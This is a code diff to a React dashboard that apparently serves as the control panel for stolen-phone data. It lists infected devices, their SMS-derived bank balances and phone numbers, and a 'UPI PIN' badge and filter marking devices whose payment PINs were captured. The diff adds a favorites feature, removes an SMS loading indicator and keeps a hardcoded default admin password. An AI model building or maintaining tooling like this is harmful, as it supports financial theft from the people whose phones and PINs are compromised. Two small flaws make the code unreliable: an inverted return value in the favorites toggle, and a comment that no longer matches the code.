@@ -154,6 +154,7 @@
       ArrowUpRight: '<path d="M7 7h10v10"/><path d="m7 17 10-10"/>',
       Wifi: '<path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" x2="12.01" y1="20" y2="20"/>',
       Phone: '<path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 12 19.79 19.79 0 0 1 1.61 3.18A2 2 0 0 1 3.6 1h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L7.91 9a16 16 0 0 0 6.09 6.09l1.36-.91a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>',
+      Star: '<polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/>',
     };
     function Icon({ name, className = 'w-4 h-4' }) {
       return <Svg d={ICONS[name] || ''} className={className} />;
@@ -165,6 +166,7 @@
       ADMIN_PASS: 'profex_admin_pass',
       FIREBASE_ACCOUNTS: 'profex_firebase_accounts',
       ACTIVE_SERVERS: 'profex_active_servers',
+      FAVORITE_DEVICES: 'profex_favorite_devices',
     };
     const DEFAULT_PASS = 'profex2024';
 
@@ -184,6 +186,20 @@
     function saveAccounts(a) { storageSave(KEYS.FIREBASE_ACCOUNTS, a); }
     function getActiveServerIds() { return storageLoad(KEYS.ACTIVE_SERVERS, []); }
     function saveActiveServerIds(ids) { storageSave(KEYS.ACTIVE_SERVERS, ids); }
+    function getFavoriteDevices() { return storageLoad(KEYS.FAVORITE_DEVICES, []); }
+    function saveFavoriteDevices(devs) { storageSave(KEYS.FAVORITE_DEVICES, devs); }
+    function toggleFavoriteDevice(deviceId, serverId) {
+      const favs = getFavoriteDevices();
+      const key = `${serverId}_${deviceId}`;
+      const idx = favs.indexOf(key);
+      if (idx === -1) favs.push(key); else favs.splice(idx, 1);
+      saveFavoriteDevices(favs);
+      return !favs.includes(key);
+    }
+    function isFavorite(deviceId, serverId) {
+      const favs = getFavoriteDevices();
+      return favs.includes(`${serverId}_${deviceId}`);
+    }
 
     // ─── Utils ───────────────────────────────────────────────────────────────────
     function timeAgo(ts) {
@@ -433,6 +449,7 @@
       if (!raw || typeof raw !== 'object') return msgs;
       const twoHoursAgo = Date.now() - 2 * 60 * 60 * 1000;
       const entries = Object.entries(raw);
+      // Get last 150 messages first, then filter by time
       const slice = entries.length > 150 ? entries.slice(entries.length - 150) : entries;
       for (const [, v] of slice) {
         if (!v || typeof v !== 'object') continue;
@@ -441,7 +458,7 @@
         if (!text.trim()) continue;
         const timeStr = String(m.dateTime || m.date || '');
         const ts = normalizeTimestamp(timeStr);
-        // Only include messages from last 2 hours; keep messages with no parseable timestamp
+        // Only include messages from last 2 hours; discard older messages
         if (ts !== null && ts < twoHoursAgo) continue;
         msgs.push({ text, sender: String(m.sender || m.from || 'Unknown'), time: timeStr, ts });
       }
@@ -1010,18 +1027,25 @@
       const topBank = hasBank ? d.smsAnalysis.bankBalances[0] : null;
       const phone = d.phoneNumber !== '—' ? d.phoneNumber : d.smsAnalysis?.phoneNumbers[0] || '—';
       const network = d.provider !== '—' ? d.provider : d.smsAnalysis?.networks[0] || null;
+      const fav = isFavorite(d.id, d.serverId);
 
       return (
         <div onClick={onClick}
           className="group relative bg-[#111111] border border-[#1f1f1f] rounded-2xl p-4 cursor-pointer transition-all duration-200 hover:border-[#2a2a2a] hover:bg-[#161616] hover:shadow-xl hover:shadow-black/40 hover:-translate-y-0.5 active:translate-y-0">
-          {serverColor && <div className="absolute top-3 right-3 w-1.5 h-1.5 rounded-full" style={{ background: serverColor }} title={d.serverName} />}
-
+          
           <div className="flex items-start gap-3 mb-3">
             <div className={`w-10 h-10 rounded-xl flex items-center justify-center flex-shrink-0 ${d.status ? 'bg-emerald-500/15 border border-emerald-500/25' : 'bg-[#1a1a1a] border border-[#262626]'}`}>
               <Icon name="Smartphone" className={`w-5 h-5 ${d.status ? 'text-emerald-400' : 'text-[#444]'}`} />
             </div>
             <div className="flex-1 min-w-0">
-              <h3 className="text-sm font-bold text-white truncate leading-tight">{d.name}</h3>
+              <div className="flex items-center gap-2">
+                <h3 className="text-sm font-bold text-white truncate leading-tight">{d.name}</h3>
+                <button onClick={e => { e.stopPropagation(); toggleFavoriteDevice(d.id, d.serverId); }}
+                  className={`p-0.5 rounded transition-all ${fav ? 'text-yellow-400' : 'text-[#333] hover:text-[#555]'}`}
+                  title={fav ? 'Remove from favorites' : 'Add to favorites'}>
+                  <Icon name="Star" className={`w-3.5 h-3.5 ${fav ? 'fill-yellow-400' : ''}`} />
+                </button>
+              </div>
               <p className="text-[10px] font-mono text-[#555] mt-0.5 truncate">{d.id}</p>
               {d.serverName && <p className="text-[9px] text-[#333] mt-0.5 truncate">{d.serverName}</p>}
             </div>
@@ -1098,7 +1122,12 @@
                 {d.lastSeen && <span className="text-[10px] font-mono text-[#444] bg-[#111] px-1.5 py-0.5 rounded border border-[#1e1e1e]">{timeAgo(d.lastSeen)}</span>}
               </div>
             )}
-            {d.upipin && <span className="ml-auto px-2 py-0.5 rounded-full bg-amber-500/10 border border-amber-500/20 text-[10px] font-semibold text-amber-400">UPI PIN</span>}
+            <button onClick={e => { e.stopPropagation(); toggleFavoriteDevice(d.id, d.serverId); }}
+              className={`p-0.5 rounded transition-all ${fav ? 'text-yellow-400' : 'text-[#333] hover:text-[#555]'}`}
+              title={fav ? 'Remove from favorites' : 'Add to favorites'}>
+              <Icon name="Star" className={`w-3.5 h-3.5 ${fav ? 'fill-yellow-400' : ''}`} />
+            </button>
+            {d.upipin && <span className="px-2 py-0.5 rounded-full bg-amber-500/10 border border-amber-500/20 text-[10px] font-semibold text-amber-400">UPI PIN</span>}
           </div>
         </div>
       );
@@ -1461,7 +1490,6 @@
     function Dashboard({ servers, onLogout, onBackToConnect }) {
       const [devices, setDevices] = useState([]);
       const [loading, setLoading] = useState(true);
-      const [smsLoading, setSmsLoading] = useState(false);
       const [selectedDevice, setSelectedDevice] = useState(null);
       const [filter, setFilter] = useState('all');
       const [sort, setSort] = useState('new');
@@ -1540,7 +1568,6 @@
       const loadSmsForDevices = useCallback(async (devList, forceReload = false) => {
         const toLoad = devList.filter(d => forceReload || !smsLoadedRef.current.has(d.id + '_' + d.serverId));
         if (toLoad.length === 0) return;
-        setSmsLoading(true);
         // Load ALL devices in parallel — no sequential batching, so data is ready before user scrolls
         await Promise.all(toLoad.map(async dev => {
           const server = servers.find(s => s.id === dev.serverId); if (!server) return;
@@ -1553,7 +1580,6 @@
             smsLoadedRef.current.add(dev.id + '_' + dev.serverId);
           } catch {}
         }));
-        setSmsLoading(false);
       }, [servers]);
 
       useEffect(() => {
@@ -1607,6 +1633,7 @@
       }, [devices]);
 
       const filtered = devices.filter(d => {
+        if (filter === 'favorite') return isFavorite(d.id, d.serverId);
         if (filter === 'online' && !d.status) return false;
         if (filter === 'offline' && d.status) return false;
         if (filter === 'upi' && !d.upipin) return false;
@@ -1619,6 +1646,11 @@
         if (q && !d.name.toLowerCase().includes(q) && !d.phoneNumber.includes(q) && !d.id.includes(q)) return false;
         return true;
       }).sort((a, b) => {
+        // Favorites always first
+        const aFav = isFavorite(a.id, a.serverId);
+        const bFav = isFavorite(b.id, b.serverId);
+        if (aFav && !bFav) return -1;
+        if (!aFav && bFav) return 1;
         if (sort === 'name') return a.name.localeCompare(b.name);
         if (sort === 'battery') return b.batteryPercent - a.batteryPercent;
         if (sort === 'old') return a.id.localeCompare(b.id);
@@ -1748,6 +1780,11 @@
                 <button onClick={() => loadAllDevices(false)} className="p-2 rounded-lg bg-[#111] border border-[#222] text-[#555] hover:text-[#888] hover:border-[#333] transition-all">
                   <Icon name="RefreshCw" className="w-3.5 h-3.5" />
                 </button>
+                <button onClick={() => setFilter(filter === 'favorite' ? 'all' : 'favorite')}
+                  className={`flex items-center gap-1 px-2.5 py-1.5 rounded-lg text-xs font-semibold transition-all ${filter === 'favorite' ? 'bg-yellow-600/20 text-yellow-400 border border-yellow-600/30' : 'text-[#555] hover:text-[#888]'}`}>
+                  <Icon name="Star" className="w-3.5 h-3.5" />
+                  Favorites
+                </button>
               </div>
             </div>
           </div>
@@ -1787,12 +1824,6 @@
               </div>
             ) : (
               <div>
-                {smsLoading && (
-                  <div className="flex items-center gap-2 mb-4 px-3 py-2 rounded-xl bg-[#111] border border-[#1e1e1e] w-fit">
-                    <div className="w-3 h-3 border-2 border-[#333] border-t-emerald-500 rounded-full animate-spin" />
-                    <span className="text-xs text-[#555]">Loading SMS data…</span>
-                  </div>
-                )}
                 {filtered.length === 0 && devices.length > 0 ? (
                   <div className="flex flex-col items-center justify-center py-20 text-center">
                     <Icon name="Search" className="w-10 h-10 text-[#2a2a2a] mb-3" />
